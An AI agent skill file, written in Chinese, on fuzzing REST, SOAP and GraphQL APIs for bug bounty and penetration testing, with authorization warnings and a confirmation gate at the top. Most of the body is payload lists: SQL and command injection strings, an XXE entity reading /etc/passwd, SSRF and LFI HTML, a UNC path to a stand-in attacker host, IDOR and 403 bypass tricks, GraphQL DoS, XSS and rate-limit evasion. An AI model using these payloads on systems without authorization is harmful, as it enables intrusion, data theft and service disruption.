---
name: api-fuzzing-bug-bounty
description: "提供在漏洞赏金挖掘和渗透测试工作中测试 REST、SOAP 和 GraphQL API 的全面技术。涵盖漏洞发现、身份验证绕过、IDOR 利用以及针对 API 的特定攻击向量。"
risk: offensive
source: community
author: zebbern
date_added: "2026-02-27"
---

> **⚠️ 仅限授权使用**
> 本技能仅用于教育目的或经授权的安全评估。
> 在使用本工具前，你必须获得系统所有者明确的书面授权。
> 滥用本工具属于非法行为，严格禁止。

> **强制确认关卡**
> 在运行任何会探测、利用、更改、持久化于目标、从目标提取数据或尝试获取目标凭据的命令之前：
> 1. 要求用户说明确切的目标 URL、IP、账户或资源。
> 2. 要求用户确认书面授权以及允许的范围。
> 3. 展示确切的命令，并解释其预期效果。
> 4. 等待在当前对话中获得明确确认。
>
> 未获得该确认前，保持只读状态，仅提供防御性指导。优先使用沙箱、可弃用的虚拟机或受控实验环境。

> 仅限授权使用：仅在经授权的安全评估、防御性验证或受控教育环境中使用本技能。

# 针对漏洞赏金的 API 模糊测试

## 目的

提供在漏洞赏金挖掘和渗透测试工作中测试 REST、SOAP 和 GraphQL API 的全面技术。涵盖漏洞发现、身份验证绕过、IDOR 利用以及针对 API 的特定攻击向量。

## 输入/前提条件

- Burp Suite 或类似的代理工具
- API 字典表(SecLists、api_wordlist)
- 对 REST/GraphQL/SOAP 协议的理解
- 用于脚本编写的 Python
- 目标 API 端点及文档(如有)

## 输出/交付物

- 发现的 API 漏洞
- IDOR 利用证明
- 身份验证绕过技术
- SQL 注入点
- 未授权数据访问的记录文档

---

## API 类型概览

| 类型 | 协议 | 数据格式 | 结构 |
|------|----------|-------------|-----------|
| SOAP | HTTP | XML | 头部 + 主体 |
| REST | HTTP | JSON/XML/URL | 定义好的端点 |
| GraphQL | HTTP | 自定义查询 | 单一端点 |

---

## 核心工作流程

### 第 1 步：API 侦察

识别 API 类型并枚举端点：

```bash
# 检查 Swagger/OpenAPI 文档
/swagger.json
/openapi.json
/api-docs
/v1/api-docs
/swagger-ui.html

# 使用 Kiterunner 进行 API 发现
kr scan https://target.com -w routes-large.kite

# 从 Swagger 中提取路径
python3 json2paths.py swagger.json
```

### 第 2 步：身份验证测试

```bash
# 测试不同的登录路径
/api/mobile/login
/api/v3/login
/api/magic_link
/api/admin/login

# 检查认证端点的速率限制
# 如果没有速率限制 → 可能存在暴力破解风险

# 分别测试移动端与网页端 API
# 不要假设它们的安全控制相同
```

### 第 3 步：IDOR 测试

不安全的直接对象引用(Insecure Direct Object Reference)是最常见的 API 漏洞：

```bash
# 基本 IDOR
GET /api/users/1234 → GET /api/users/1235

# 即使 ID 是基于邮箱的，也要尝试数字形式
/?user_id=111 而不是 /?user_id=user@mail.com

# 测试 /me/orders 与 /user/654321/orders
```

**IDOR 绕过技巧：**

```bash
# 用数组包裹 ID
{"id":111} → {"id":[111]}

# JSON 包裹
{"id":111} → {"id":{"id":111}}

# 发送两次 ID
URL?id=<合法ID>&id=<受害者ID>

# 通配符注入
{"user_id":"*"}

# 参数污染
/api/get_profile?user_id=<受害者>&user_id=<合法>
{"user_id":<合法id>,"user_id":<受害者id>}
```

### 第 4 步：注入测试

**JSON 中的 SQL 注入：**

```json
{"id":"56456"}                    → 正常
{"id":"56456 AND 1=1#"}           → 正常
{"id":"56456 AND 1=2#"}           → 正常
{"id":"56456 AND 1=3#"}           → 报错(存在漏洞！)
{"id":"56456 AND sleep(15)#"}     → 延迟 15 秒
```

**命令注入：**

```bash
# Ruby on Rails
?url=Kernel#open → ?url=|ls

# Linux 命令注入
api.url.com/endpoint?name=file.txt;ls%20/
```

**XXE 注入：**

```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

**通过 API 的 SSRF：**

```html
<object data="http://127.0.0.1:8443"/>
<img src="http://127.0.0.1:445"/>
```

**.NET Path.Combine 漏洞：**

```bash
# 如果 .NET 应用使用 Path.Combine(path_1, path_2)
# 测试路径穿越
https://example.org/download?filename=a.png
https://example.org/download?filename=C:\inetpub\wwwroot\web.config
https://example.org/download?filename=\\smb.dns.attacker.com\a.png
```

### 第 5 步：方法测试

```bash
# 测试所有 HTTP 方法
GET /api/v1/users/1
POST /api/v1/users/1
PUT /api/v1/users/1
DELETE /api/v1/users/1
PATCH /api/v1/users/1

# 切换 Content-Type
Content-Type: application/json → application/xml
```

---

## GraphQL 专项测试

### 内省查询

获取整个后端的 schema：

```graphql
{__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,args{name,type{name,kind}}}}}}
```

**URL 编码版本：**

```
/graphql?query={__schema{types{name,kind,description,fields{name}}}}
```

### GraphQL IDOR

```graphql
# 尝试访问其他用户的 ID
query {
  user(id: "其他用户ID") {
    email
    password
    creditCard
  }
}
```

### GraphQL SQL/NoSQL 注入

```graphql
mutation {
  login(input: {
    email: "test' or 1=1--"
    password: "password"
  }) {
    success
    jwt
  }
}
```

### 速率限制绕过(批处理)

```graphql
mutation {login(input:{email:"a@example.com" password:"password"}){success jwt}}
mutation {login(input:{email:"b@example.com" password:"password"}){success jwt}}
mutation {login(input:{email:"c@example.com" password:"password"}){success jwt}}
```

### GraphQL DoS(嵌套查询)

```graphql
query {
  posts {
    comments {
      user {
        posts {
          comments {
            user {
              posts { ... }
            }
          }
        }
      }
    }
  }
}
```

### GraphQL XSS

```bash
# 通过 GraphQL 端点实现 XSS
http://target.com/graphql?query={user(name:"<script>alert(1)</script>"){id}}

# URL 编码的 XSS
http://target.com/example?id=%C/script%E%Cscript%Ealert('XSS')%C/script%E
```

### GraphQL 工具

| 工具 | 用途 |
|------|---------|
| GraphCrawler | Schema 发现 |
| graphw00f | 指纹识别 |
| clairvoyance | Schema 重建 |
| InQL | Burp 扩展 |
| GraphQLmap | 漏洞利用 |

---

## 端点绕过技巧

收到 403/401 响应时，可尝试以下绕过方式：

```bash
# 原始被拦截的请求
/api/v1/users/sensitivedata → 403

# 绕过尝试
/api/v1/users/sensitivedata.json
/api/v1/users/sensitivedata?
/api/v1/users/sensitivedata/
/api/v1/users/sensitivedata??
/api/v1/users/sensitivedata%20
/api/v1/users/sensitivedata%09
/api/v1/users/sensitivedata#
/api/v1/users/sensitivedata&details
/api/v1/users/..;/sensitivedata
```

---

## 输出利用

### PDF 导出攻击

```html
<!-- 通过 PDF 导出实现 LFI -->
<iframe src="file:///etc/passwd" height=1000 width=800>

<!-- 通过 PDF 导出实现 SSRF -->
<object data="http://127.0.0.1:8443"/>

<!-- 端口扫描 -->
<img src="http://127.0.0.1:445"/>

<!-- IP 泄露 -->
<img src="https://iplogger.com/yourcode.gif"/>
```

### 通过限制参数实现 DoS

```bash
# 正常请求
/api/news?limit=100

# DoS 尝试
/api/news?limit=9999999999
```

---

## 常见 API 漏洞清单

| 漏洞 | 描述 |
|---------------|-------------|
| API 暴露 | 未受保护的端点被公开暴露 |
| 缓存配置错误 | 敏感数据被错误地缓存 |
| 令牌暴露 | API 密钥/令牌出现在响应或 URL 中 |
| JWT 弱点 | 签名较弱、无过期时间、算法混淆 |
| IDOR / BOLA | 对象级授权失效(Broken Object Level Authorization) |
| 未记录的端点 | 隐藏的管理/调试端点 |
| 不同版本 | 旧版 API 中存在的安全漏洞 |
| 速率限制 | 缺失或可绕过的速率限制 |
| 竞态条件 | TOCTOU(检查时与使用时不一致)漏洞 |
| XXE 注入 | XML 解析器利用 |
| Content-Type 问题 | 在 JSON/XML 之间切换 |
| HTTP 方法篡改 | 滥用 GET→DELETE/PUT |

---

## 快速参考

| 漏洞 | 测试载荷 | 风险 |
|---------------|--------------|------|
| IDOR | 更改 user_id 参数 | 高 |
| SQLi | JSON 中的 `' OR 1=1--` | 严重 |
| 命令注入 | `; ls /` | 严重 |
| XXE | 带 ENTITY 的 DOCTYPE | 高 |
| SSRF | 参数中的内部 IP | 高 |
| 速率限制绕过 | 批量请求 | 中 |
| 方法篡改 | GET→DELETE | 高 |

---

## 工具参考

| 分类 | 工具 | URL |
|----------|------|-----|
| API 模糊测试 | Fuzzapi | github.com/Fuzzapi/fuzzapi |
| API 模糊测试 | API-fuzzer | github.com/Fuzzapi/API-fuzzer |
| API 模糊测试 | Astra | github.com/flipkart-incubator/Astra |
| API 安全 | apicheck | github.com/BBVA/apicheck |
| API 发现 | Kiterunner | github.com/assetnote/kiterunner |
| API 发现 | openapi_security_scanner | github.com/ngalongc/openapi_security_scanner |
| API 工具包 | APIKit | github.com/API-Security/APIKit |
| API 密钥 | API Guesser | api-guesser.netlify.app |
| GUID | GUID Guesser | gist.github.com/DanaEpp/8c6803e542f094da5c4079622f9b4d18 |
| GraphQL | InQL | github.com/doyensec/inql |
| GraphQL | GraphCrawler | github.com/gsmith257-cyber/GraphCrawler |
| GraphQL | graphw00f | github.com/dolevf/graphw00f |
| GraphQL | clairvoyance | github.com/nikitastupin/clairvoyance |
| GraphQL | batchql | github.com/assetnote/batchql |
| GraphQL | graphql-cop | github.com/dolevf/graphql-cop |
| 字典表 | SecLists | github.com/danielmiessler/SecLists |
| Swagger 解析器 | Swagger-EZ | rhinosecuritylabs.github.io/Swagger-EZ |
| Swagger 路由 | swagroutes | github.com/amalmurali47/swagroutes |
| API 思维导图 | MindAPI | dsopas.github.io/MindAPI/play |
| JSON 路径 | json2paths | github.com/s0md3v/dump/tree/master/json2paths |

---

## 约束条件

**必须：**
- 分别测试移动端、网页端和开发者 API
- 检查所有 API 版本(/v1、/v2、/v3)
- 同时验证已认证和未认证的访问情况

**禁止：**
- 假设各 API 版本的安全控制相同
- 跳过对未记录端点的测试
- 忽略速率限制检查

**应当：**
- 添加 `X-Requested-With: XMLHttpRequest` 头以模拟前端
- 检查 archive.org 以查找历史 API 端点
- 对敏感操作测试竞态条件

---

## 示例

### 示例 1：IDOR 利用

```bash
# 原始请求(自己的数据)
GET /api/v1/invoices/12345
Authorization: Bearer <令牌>

# 修改后的请求(其他用户的数据)
GET /api/v1/invoices/12346
Authorization: Bearer <令牌>

# 响应中泄露了其他用户的发票数据
```

### 示例 2：GraphQL 内省

```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name}}}}"}'
```

---

## 故障排查

| 问题 | 解决方案 |
|-------|----------|
| API 没有返回任何内容 | 添加 `X-Requested-With: XMLHttpRequest` 头 |
| 所有端点都返回 401 | 尝试添加 `?user_id=1` 参数 |
| GraphQL 内省被禁用 | 使用 clairvoyance 重建 schema |
| 被限速 | 使用 IP 轮换或批量请求 |
| 找不到端点 | 检查 Swagger、archive.org、JS 文件 |

## 何时使用
本技能适用于执行概述中所描述的工作流程或操作。
